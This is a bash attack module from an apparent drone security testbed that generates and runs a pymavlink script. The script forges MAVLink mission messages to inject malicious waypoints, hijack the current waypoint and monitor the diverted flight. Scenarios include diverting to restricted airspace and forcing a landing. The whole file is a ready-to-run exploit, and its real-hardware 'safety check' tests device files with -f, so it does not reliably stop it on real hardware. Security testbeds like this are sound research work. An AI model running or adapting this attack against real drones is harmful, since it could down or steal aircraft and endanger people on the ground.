#!/bin/bash
# waypoint_injection.sh - Waypoint Injection Attack Module
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/injection/waypoint_injection.sh
# Purpose: Inject malicious waypoints into drone mission using forged MISSION_ITEM MAVLink commands

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="Waypoint Injection"
TARGET_IP="${TARGET_IP:-127.0.0.1}"
MAVLINK_PORT="${MAVLINK_PORT:-14550}"
LOG_FILE="$(get_log_dir)/injection/waypoint_injection_$(date +%Y%m%d_%H%M%S).log"

# Default malicious waypoint coordinates (attacker controlled area)
DEFAULT_LAT="-35.363261"
DEFAULT_LON="149.165230"
DEFAULT_ALT="20"

print_attack_banner() {
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}         Waypoint Injection Attack          ${NC}"
    echo -e "${CYAN}============================================${NC}"
    echo -e "${YELLOW}Target: ${TARGET_IP}:${MAVLINK_PORT}${NC}"
    echo -e "${YELLOW}Purpose: Inject malicious waypoints${NC}"
    echo ""
}

check_mavlink_connection() {
    log_info "Checking MAVLink connection..."
    
    if ! nc -u -z "$TARGET_IP" "$MAVLINK_PORT" 2>/dev/null; then
        log_error "MAVLink service not accessible at ${TARGET_IP}:${MAVLINK_PORT}"
        return 1
    fi
    
    log_success "MAVLink port accessible"
    return 0
}

execute_waypoint_injection() {
    local lat="${1:-$DEFAULT_LAT}"
    local lon="${2:-$DEFAULT_LON}"
    local alt="${3:-$DEFAULT_ALT}"
    
    log_info "Starting waypoint injection attack..."
    log_info "Injecting waypoint: lat=$lat, lon=$lon, alt=${alt}m"
    
    create_injection_script "$lat" "$lon" "$alt"
    local result=$?
    
    if [ $result -eq 0 ]; then
        log_success "Waypoint injection attack completed"
        return 0
    else
        log_error "Waypoint injection attack failed"
        return 1
    fi
}

create_injection_script() {
    local lat="$1"
    local lon="$2"
    local alt="$3"
    
    local script_path="/tmp/waypoint_injection_attack.py"
    
    cat > "$script_path" << EOF
#!/usr/bin/env python3
"""
Waypoint Injection Attack
Inject malicious waypoints into drone mission using MISSION_ITEM MAVLink commands
"""

import sys
import time
from pymavlink import mavutil

class WaypointInjectionAttack:
    def __init__(self, target_ip='${TARGET_IP}', target_port=${MAVLINK_PORT}):
        self.target_ip = target_ip
        self.target_port = target_port
        self.master = None
        self.original_mission = []
        
    def connect(self):
        """Connect to the drone"""
        try:
            connection_string = f'udp:{self.target_ip}:{self.target_port}'
            print(f"[*] Connecting to {connection_string}")
            
            self.master = mavutil.mavlink_connection(connection_string, timeout=10)
            self.master.wait_heartbeat(timeout=10)
            
            print(f"[+] Connected to drone (System ID: {self.master.target_system})")
            return True
            
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def get_current_mission(self):
        """Get current mission for reference"""
        try:
            print("[*] Requesting current mission...")
            
            # Request mission count
            self.master.mav.mission_request_list_send(
                self.master.target_system,
                self.master.target_component
            )
            
            # Wait for mission count
            msg = self.master.recv_match(type='MISSION_COUNT', blocking=True, timeout=5)
            if msg:
                mission_count = msg.count
                print(f"[+] Current mission has {mission_count} waypoints")
                
                # Request each mission item
                for seq in range(mission_count):
                    self.master.mav.mission_request_int_send(
                        self.master.target_system,
                        self.master.target_component,
                        seq
                    )
                    
                    item_msg = self.master.recv_match(type='MISSION_ITEM_INT', blocking=True, timeout=3)
                    if item_msg:
                        waypoint = {
                            'seq': item_msg.seq,
                            'lat': item_msg.x / 1e7,
                            'lon': item_msg.y / 1e7,
                            'alt': item_msg.z,
                            'command': item_msg.command
                        }
                        self.original_mission.append(waypoint)
                        print(f"    WP{seq}: lat={waypoint['lat']:.6f}, lon={waypoint['lon']:.6f}, alt={waypoint['alt']:.1f}m")
                
                return True
            else:
                print("[!] No mission count response")
                return False
                
        except Exception as e:
            print(f"[-] Failed to get current mission: {e}")
            return False
    
    def inject_malicious_waypoint(self, lat, lon, alt, seq=0):
        """Inject a malicious waypoint"""
        try:
            print(f"[*] Injecting malicious waypoint...")
            print(f"    Target: lat={lat}, lon={lon}, alt={alt}m")
            print(f"    Sequence: {seq}")
            
            # Convert coordinates to MAVLink format
            lat_int = int(float(lat) * 1e7)
            lon_int = int(float(lon) * 1e7)
            alt_float = float(alt)
            
            # Send MISSION_ITEM command
            self.master.mav.mission_item_send(
                target_system=self.master.target_system,
                target_component=self.master.target_component,
                seq=seq,
                frame=mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT,
                command=mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
                current=0,  # Not current waypoint
                autocontinue=1,  # Auto continue to next waypoint
                param1=0,   # Hold time (seconds)
                param2=0,   # Acceptance radius (meters)
                param3=0,   # Pass through waypoint
                param4=0,   # Yaw angle (degrees)
                x=float(lat),
                y=float(lon),
                z=alt_float
            )
            
            print("[+] MISSION_ITEM command sent")
            time.sleep(1)
            
            # Try alternative method with MISSION_ITEM_INT
            self.master.mav.mission_item_int_send(
                target_system=self.master.target_system,
                target_component=self.master.target_component,
                seq=seq + 100,  # Different sequence to avoid conflicts
                frame=mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
                command=mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
                current=0,
                autocontinue=1,
                param1=0,
                param2=0,
                param3=0,
                param4=0,
                x=lat_int,  # Latitude in 1E7 format
                y=lon_int,  # Longitude in 1E7 format
                z=alt_float,
                mission_type=mavutil.mavlink.MAV_MISSION_TYPE_MISSION
            )
            
            print("[+] MISSION_ITEM_INT command sent")
            return True
            
        except Exception as e:
            print(f"[-] Failed to inject waypoint: {e}")
            return False
    
    def inject_multiple_waypoints(self, waypoints):
        """Inject multiple malicious waypoints"""
        print(f"[*] Injecting {len(waypoints)} malicious waypoints...")
        
        successful_injections = 0
        
        for i, wp in enumerate(waypoints):
            print(f"[*] Injecting waypoint {i+1}/{len(waypoints)}")
            
            if self.inject_malicious_waypoint(wp['lat'], wp['lon'], wp['alt'], wp['seq']):
                successful_injections += 1
                print(f"[+] Waypoint {i+1} injected successfully")
            else:
                print(f"[-] Failed to inject waypoint {i+1}")
            
            time.sleep(1)  # Rate limiting
        
        print(f"[RESULT] Successfully injected {successful_injections}/{len(waypoints)} waypoints")
        return successful_injections > 0
    
    def hijack_current_waypoint(self, lat, lon, alt):
        """Hijack the current active waypoint"""
        try:
            print("[*] Attempting to hijack current waypoint...")
            
            # Set as current waypoint (current=1)
            self.master.mav.mission_item_send(
                target_system=self.master.target_system,
                target_component=self.master.target_component,
                seq=0,
                frame=mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT,
                command=mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
                current=1,  # Set as current waypoint
                autocontinue=1,
                param1=0,
                param2=0,
                param3=0,
                param4=0,
                x=float(lat),
                y=float(lon),
                z=float(alt)
            )
            
            print("[+] Current waypoint hijacked!")
            print(f"[!] Drone should now navigate to: {lat}, {lon}, {alt}m")
            return True
            
        except Exception as e:
            print(f"[-] Waypoint hijack failed: {e}")
            return False
    
    def monitor_mission_progress(self, duration=30):
        """Monitor mission progress to verify injection"""
        print(f"[*] Monitoring mission progress for {duration} seconds...")
        
        start_time = time.time()
        last_waypoint = -1
        
        while time.time() - start_time < duration:
            try:
                msg = self.master.recv_match(
                    type=['MISSION_CURRENT', 'POSITION_TARGET_GLOBAL_INT', 'GLOBAL_POSITION_INT'],
                    blocking=False,
                    timeout=1
                )
                
                if msg:
                    msg_type = msg.get_type()
                    
                    if msg_type == 'MISSION_CURRENT':
                        if msg.seq != last_waypoint:
                            print(f"[INFO] Current waypoint: {msg.seq}")
                            last_waypoint = msg.seq
                    
                    elif msg_type == 'GLOBAL_POSITION_INT':
                        lat = msg.lat / 1e7
                        lon = msg.lon / 1e7
                        alt = msg.relative_alt / 1000
                        print(f"[POS] Current: lat={lat:.6f}, lon={lon:.6f}, alt={alt:.1f}m")
                    
                    elif msg_type == 'POSITION_TARGET_GLOBAL_INT':
                        target_lat = msg.lat_int / 1e7
                        target_lon = msg.lon_int / 1e7
                        target_alt = msg.alt
                        print(f"[TARGET] Heading to: lat={target_lat:.6f}, lon={target_lon:.6f}, alt={target_alt:.1f}m")
                
            except Exception:
                continue
        
        print("[+] Mission monitoring completed")
        return True

def main():
    # Attack parameters
    target_lat = '${lat}'
    target_lon = '${lon}'
    target_alt = '${alt}'
    
    print("=" * 60)
    print("         Waypoint Injection Attack")
    print("=" * 60)
    print(f"Target coordinates: {target_lat}, {target_lon}, {target_alt}m")
    print("WARNING: This attack modifies drone mission!")
    print()
    
    # Initialize attack
    attack = WaypointInjectionAttack()
    
    # Connect to drone
    if not attack.connect():
        print("[-] Attack failed: Cannot connect to drone")
        return 1
    
    # Get current mission for reference
    attack.get_current_mission()
    
    # Method 1: Single waypoint injection
    print("\n[ATTACK 1] Single waypoint injection")
    if attack.inject_malicious_waypoint(target_lat, target_lon, target_alt, 999):
        print("[+] Single waypoint injection successful!")
    else:
        print("[-] Single waypoint injection failed")
    
    time.sleep(2)
    
    # Method 2: Multiple waypoint injection
    print("\n[ATTACK 2] Multiple waypoint injection")
    malicious_waypoints = [
        {'seq': 1000, 'lat': target_lat, 'lon': target_lon, 'alt': target_alt},
        {'seq': 1001, 'lat': str(float(target_lat) + 0.001), 'lon': target_lon, 'alt': str(float(target_alt) + 5)},
        {'seq': 1002, 'lat': target_lat, 'lon': str(float(target_lon) + 0.001), 'alt': str(float(target_alt) + 10)}
    ]
    
    if attack.inject_multiple_waypoints(malicious_waypoints):
        print("[+] Multiple waypoint injection successful!")
    else:
        print("[-] Multiple waypoint injection failed")
    
    time.sleep(2)
    
    # Method 3: Current waypoint hijacking
    print("\n[ATTACK 3] Current waypoint hijacking")
    if attack.hijack_current_waypoint(target_lat, target_lon, target_alt):
        print("[+] Current waypoint hijacking successful!")
        print("[!] *** MISSION COMPROMISED ***")
        print("[!] Drone navigation redirected to attacker location!")
    else:
        print("[-] Current waypoint hijacking failed")
    
    # Monitor results
    print("\n[MONITORING] Mission progress...")
    attack.monitor_mission_progress(20)
    
    return 0

if __name__ == "__main__":
    try:
        exit_code = main()
        sys.exit(exit_code)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Attack failed with error: {e}")
        sys.exit(1)
EOF

    chmod +x "$script_path"
    
    log_info "Executing waypoint injection script..."
    python3 "$script_path" 2>&1 | tee -a "$LOG_FILE"
    local result=${PIPESTATUS[0]}
    
    # Cleanup
    rm -f "$script_path" 2>/dev/null
    
    return $result
}

# Interactive mode for waypoint selection
interactive_mode() {
    echo -e "${CYAN}=== Interactive Waypoint Injection Configuration ===${NC}"
    echo ""
    
    echo -e "${YELLOW}Enter malicious waypoint coordinates:${NC}"
    
    read -p "Latitude [${DEFAULT_LAT}]: " custom_lat
    custom_lat="${custom_lat:-$DEFAULT_LAT}"
    
    read -p "Longitude [${DEFAULT_LON}]: " custom_lon
    custom_lon="${custom_lon:-$DEFAULT_LON}"
    
    read -p "Altitude in meters [${DEFAULT_ALT}]: " custom_alt
    custom_alt="${custom_alt:-$DEFAULT_ALT}"
    
    echo ""
    echo -e "${GREEN}Injection Configuration:${NC}"
    echo -e "• Latitude: $custom_lat"
    echo -e "• Longitude: $custom_lon" 
    echo -e "• Altitude: ${custom_alt}m"
    echo ""
    
    read -p "Proceed with waypoint injection? (y/N): " confirm
    if [ "$confirm" = "y" ] || [ "$confirm" = "Y" ]; then
        execute_waypoint_injection "$custom_lat" "$custom_lon" "$custom_alt"
    else
        log_info "Attack cancelled by user"
        return 0
    fi
}

# Predefined attack scenarios
attack_scenarios() {
    echo -e "${CYAN}=== Predefined Attack Scenarios ===${NC}"
    echo ""
    echo "1. Redirect to Attacker Base (Default)"
    echo "2. Force Emergency Landing"
    echo "3. Divert to Restricted Airspace"
    echo "4. Multi-waypoint Hijack"
    echo "5. Custom coordinates"
    echo ""
    
    read -p "Select attack scenario [1-5]: " choice
    
    case $choice in
        1)
            log_info "Scenario: Redirect to Attacker Base"
            execute_waypoint_injection "$DEFAULT_LAT" "$DEFAULT_LON" "$DEFAULT_ALT"
            ;;
        2)
            log_info "Scenario: Force Emergency Landing"
            execute_waypoint_injection "$DEFAULT_LAT" "$DEFAULT_LON" "0"
            ;;
        3)
            log_info "Scenario: Divert to Restricted Airspace"
            # Coordinates near airport or restricted area (example)
            execute_waypoint_injection "-35.3075" "149.1947" "50"
            ;;
        4)
            log_info "Scenario: Multi-waypoint Hijack"
            # This will be handled by the Python script
            execute_waypoint_injection "$DEFAULT_LAT" "$DEFAULT_LON" "$DEFAULT_ALT"
            ;;
        5)
            interactive_mode
            ;;
        *)
            log_error "Invalid selection"
            return 1
            ;;
    esac
}

show_attack_info() {
    echo -e "${BLUE}Attack Information:${NC}"
    echo -e "• ${YELLOW}Attack Type:${NC} Mission Manipulation"
    echo -e "• ${YELLOW}Method:${NC} MISSION_ITEM MAVLink injection"
    echo -e "• ${YELLOW}Target:${NC} Drone mission waypoints"
    echo -e "• ${YELLOW}Impact:${NC} Mission hijacking/diversion"
    echo -e "• ${YELLOW}Stealth:${NC} High (appears as normal mission)"
    echo ""
    echo -e "${RED}WARNING:${NC} This attack can cause drone loss or crash!"
    echo ""
}

perform_safety_check() {
    log_info "Performing safety checks..."
    
    # Check for real hardware
    if [ -f "/dev/ttyUSB0" ] || [ -f "/dev/ttyACM0" ]; then
        log_error "Real hardware detected! This attack is for simulation only."
        return 1
    fi
    
    # Check for flight controller
    if lsusb | grep -i "px4\|ardupilot\|3dr"; then
        log_error "Flight controller hardware detected! Aborting for safety."
        return 1
    fi
    
    log_success "Safety checks passed - simulation environment confirmed"
    return 0
}

main() {
    print_attack_banner
    
    # Safety checks
    if ! perform_safety_check; then
        exit 1
    fi
    
    # Root check
    if ! check_root; then
        exit 1
    fi
    
    # Tool requirements
    if ! check_required_tools python3 nc; then
        log_error "Missing required tools"
        exit 1
    fi
    
    # Install Python dependencies
    log_info "Installing Python dependencies..."
    pip3 install pymavlink >/dev/null 2>&1
    
    # Check MAVLink connection
    if ! check_mavlink_connection; then
        log_warning "Proceeding without connection verification"
    fi
    
    # Show attack information
    show_attack_info
    
    # Initialize logging
    mkdir -p "$(dirname "$LOG_FILE")"
    echo "=== Waypoint Injection Attack Started at $(date) ===" > "$LOG_FILE"
    
    # Parse arguments
    case "${1:-default}" in
        "interactive"|"-i")
            interactive_mode
            ;;
        "scenarios"|"-s")
            attack_scenarios
            ;;
        "coordinates"|"-c")
            if [ $# -ge 4 ]; then
                execute_waypoint_injection "$2" "$3" "$4"
            else
                log_error "Usage: $0 coordinates <lat> <lon> <alt>"
                exit 1
            fi
            ;;
        "default"|"")
            log_info "Using default attacker coordinates"
            execute_waypoint_injection
            ;;
        "help"|"-h")
            echo "Usage: $0 [mode] [options]"
            echo ""
            echo "Modes:"
            echo "  default                    Use default coordinates"
            echo "  interactive, -i            Interactive coordinate selection"
            echo "  scenarios, -s              Select from predefined scenarios"
            echo "  coordinates, -c <lat> <lon> <alt>  Use specific coordinates"
            echo "  help, -h                   Show this help"
            echo ""
            echo "Examples:"
            echo "  $0                         # Default attack"
            echo "  $0 interactive             # Interactive mode"
            echo "  $0 scenarios               # Attack scenarios"
            echo "  $0 coordinates -35.0 149.0 25  # Custom coordinates"
            exit 0
            ;;
        *)
            log_error "Unknown option: $1"
            echo "Use '$0 help' for usage information"
            exit 1
            ;;
    esac
    
    exit $?
}

# Execute if called directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi